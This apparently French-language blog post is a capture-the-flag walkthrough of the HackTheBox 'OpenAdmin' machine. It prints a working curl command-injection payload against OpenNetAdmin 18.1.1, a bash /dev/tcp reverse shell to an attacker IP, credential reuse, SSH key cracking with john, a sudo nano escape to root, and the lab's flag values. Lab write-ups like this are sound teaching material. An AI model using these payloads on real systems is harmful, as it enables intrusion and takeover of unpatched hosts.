---
layout: post
title: "HackTheBox - OpenAdmin"
date: 2026-01-15 18:00:00 +0100
author: Howl
categories: [ctf]
tags: [linux, opennetadmin, lfi, rce, sudo, nano, medium]
platform: hackthebox
difficulty: medium
excerpt: "Machine Linux exploitant OpenNetAdmin 18.1.1 (RCE), puis une escalade via LFI pour récupérer une clé SSH privée, et enfin sudo nano pour passer root."
---

## Informations

| Champ       | Valeur              |
|-------------|---------------------|
| Plateforme  | HackTheBox          |
| OS          | Linux               |
| Difficulté  | Medium              |
| IP          | 10.10.10.171        |
| Release     | 04 Janvier 2020     |

---

## Reconnaissance

```bash
nmap -sC -sV 10.10.10.171
```

```
22/tcp open  ssh    OpenSSH 7.6p1
80/tcp open  http   Apache 2.4.29
```

### Énumération web

```bash
gobuster dir -u http://10.10.10.171 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Résultats :
- `/music` — Site principal
- `/ona`   — **OpenNetAdmin**

En visitant `/ona`, on voit la version : **OpenNetAdmin 18.1.1**

---

## Exploitation — RCE OpenNetAdmin

On cherche un exploit :

```bash
searchsploit opennetadmin
# OpenNetAdmin 18.1.1 - Remote Code Execution
```

Ou directement avec ce one-liner :

```bash
curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"Content-Type: text/plain\"; /bin/cat /etc/passwd&xajaxargs[]=ping" \
  "http://10.10.10.171/ona/"
```

On obtient l'exécution de commandes. On monte un reverse shell :

```bash
# Listener
nc -lvnp 4444

# Payload
bash -c 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1'
```

---

## Élévation de privilèges

### Pivot vers jimmy

En fouillant les fichiers de config d'ONA :

```bash
cat /opt/ona/www/local/config/database_settings.inc.php
# 'db_passwd' => 'n1nj4W4rri0R!'
```

On essaie ce mot de passe pour les utilisateurs locaux :

```bash
su jimmy
# Password: n1nj4W4rri0R! ✓
```

### Pivot vers joanna via LFI

Dans le répertoire de jimmy, un fichier PHP permet de lire une clé SSH privée via LFI :

```bash
curl http://127.0.0.1:52846/main.php
# Affiche la clé privée RSA de joanna
```

On sauvegarde la clé, on la craque avec john :

```bash
ssh2john id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
# bloodninjas
```

```bash
ssh -i id_rsa joanna@10.10.10.171
# Passphrase: bloodninjas ✓
```

### Pivot vers root via sudo nano

```bash
sudo -l
# (ALL) NOPASSWD: /bin/nano /opt/priv
```

On exploite nano avec GTFOBins :

```
sudo /bin/nano /opt/priv
# Dans nano : Ctrl+R, Ctrl+X
# Command: reset; sh 1>&0 2>&0
```

On est **root** !

---

## Flags

```bash
cat /home/joanna/user.txt
# c9b2cf07d40807e62af62660f0c81b5f

cat /root/root.txt
# 2f907ed450b361b2c2bf4e8795d5b561
```

---

## Conclusion

OpenAdmin illustre une belle chaîne d'exploitation : RCE → réutilisation de credential → LFI pour clé SSH → sudo misconfiguration.

**Outils :** `nmap`, `gobuster`, `curl`, `ssh2john`, `john`, `GTFOBins`
